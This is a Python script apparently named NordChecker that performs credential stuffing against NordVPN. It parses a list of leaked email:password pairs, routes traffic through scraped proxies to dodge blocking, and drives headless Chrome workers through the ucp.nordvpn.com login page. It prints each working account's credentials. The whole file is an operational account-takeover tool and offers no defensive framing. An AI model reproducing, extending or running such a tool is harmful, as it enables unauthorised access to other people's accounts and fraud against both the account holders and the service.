import re
import asyncio
from proxybroker import Broker
from colorama import Fore, Style
from argparse import ArgumentParser, RawDescriptionHelpFormatter
from selenium.webdriver import Chrome
from selenium.webdriver import ChromeOptions
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException
from threading import Thread
from queue import Queue
import random
import time
import psutil
import os
import logging

logging.getLogger("checker").setLevel(logging.CRITICAL)
PROXIES = []


async def fetch(proxies):
    while True:
        proxy = await proxies.get()
        if proxy is None:
            break
        PROXIES.append("{}:{}".format(proxy.host, proxy.port))


PROC_REGX = "chromedriver"

for process in psutil.process_iter():
    proc_name: str = process.name()
    if proc_name.count(PROC_REGX) > 0:
        print(process.kill())


parser = ArgumentParser(description="A damn easy nordvpn account validator")
parser.add_argument(
    "--file", help="The file name containing all username password", required=True, metavar="PATH")
parser.add_argument(
    "--separator", help="Username and password separator", required=True)
parser.add_argument(
    "--workers", help="Set the number of workers. default: 3", default=3, type=int, metavar="")

args = parser.parse_args()

proxies = asyncio.Queue()
broker = Broker(proxies)
tasks = asyncio.gather(
    broker.find(types=["HTTP"], countries=["UK", "IN"], limit=1),
    fetch(proxies))

loop = asyncio.get_event_loop()
loop.run_until_complete(tasks)

with open(args.file) as file:
    # pylint: disable=anomalous-backslash-in-string
    raw = re.findall(
        "[a-z].+@.+\..+{}.+".format(args.separator), file.read())

if os.system("cls") != 0:
    os.system("clear")

# pylint: disable=anomalous-backslash-in-string
print("""{}  _   _               _  ____ _               _             
 | \ | | ___  _ __ __| |/ ___| |__   ___  ___| | _____ _ __ 
 |  \| |/ _ \| '__/ _` | |   | '_ \ / _ \/ __| |/ / _ \ '__|
 | |\  | (_) | | | (_| | |___| | | |  __/ (__|   <  __/ |   
 |_| \_|\___/|_|  \__,_|\____|_| |_|\___|\___|_|\_\___|_|   
                                                           {}""".format(Fore.LIGHTRED_EX, Style.RESET_ALL))

print("{}[!]{} Parsing from '{}'".format(
    Fore.LIGHTYELLOW_EX, Style.RESET_ALL, args.file))

print("{}[!]{} {} Credentials found".format(
    Fore.LIGHTYELLOW_EX, Style.RESET_ALL, len(raw)))

raw = list(map(lambda cred: {"email": cred.split(args.separator)[
    0], "password": cred.split(args.separator)[1]}, raw))
creds = Queue()

for _ in raw:
    creds.put(_)

options = ChromeOptions()
options.add_argument("--proxy-server=http://%s" % PROXIES[0])

print("{}[!]{} Activated {} workers".format(
    Fore.LIGHTYELLOW_EX, Style.RESET_ALL, args.workers))


total = creds.qsize()

print("{}[!]{} Working accounts will be listed below in the format {}EMAIL:PASSWORD{}".format(
    Fore.LIGHTYELLOW_EX, Style.RESET_ALL, Fore.LIGHTMAGENTA_EX, Style.RESET_ALL))


def check(name):
    cred = {}
    while not creds.empty():
        cred = creds.get()
        driver = Chrome(options=options)
        driver.set_page_load_timeout(60)
        driver.minimize_window()
        driver.get("https://ucp.nordvpn.com/login/")
        if driver.title.endswith("Violation") or driver.title.endswith("Cloudflare") or re.findall(r"ERR_TUNNEL_CONNECTION_FAILED", driver.page_source):
            error = "{}[X]{} MESSAGE FROM {} -> Fatal Error: Unable to get the endpoint\n".format(
                Fore.LIGHTRED_EX, Style.RESET_ALL, name)
            error += "{}[!]{} MESSAGE FROM {} -> Suggestions: Re Run the Program".format(
                Fore.LIGHTYELLOW_EX, Style.RESET_ALL, name)
            print(error)
            driver.quit()
            quit(1)
        if re.findall(r"ERR_TIMED_OUT", driver.page_source):
            creds.put(cred)
            return
        wait = WebDriverWait(driver, 20000)
        wait.until(EC.presence_of_element_located((By.NAME, "username")))

        try:
            username = driver.find_element_by_name("username")
            password = driver.find_element_by_name("password")
            login = driver.find_element_by_xpath(
                "//button[@class='Button Button--blue Button--block mb-3 mt-5']")
            username.send_keys(cred["email"])
            password.send_keys(cred["password"])
            login.click()

            driver.get("https://ucp.nordvpn.com/login/")
            try:
                driver.find_element_by_name("username")
            except NoSuchElementException:
                print("{}[#]{} {}:{}".format(Fore.LIGHTGREEN_EX,
                                             Style.RESET_ALL, cred["email"], cred["password"]))
            finally:
                print("{}[$]{} {} left out of {}\r".format(Fore.LIGHTCYAN_EX,
                                                           Style.RESET_ALL, creds.qsize(), total), end="")
                driver.quit()
                time.sleep(2)
                pass
        except NoSuchElementException:
            creds.put(cred)


threads = []

for worker in range(args.workers):
    t = Thread(target=check, args=("WORKER-%d" % (worker+1),))
    t.start()
    threads.append(t)

for thread in threads:
    thread.join()
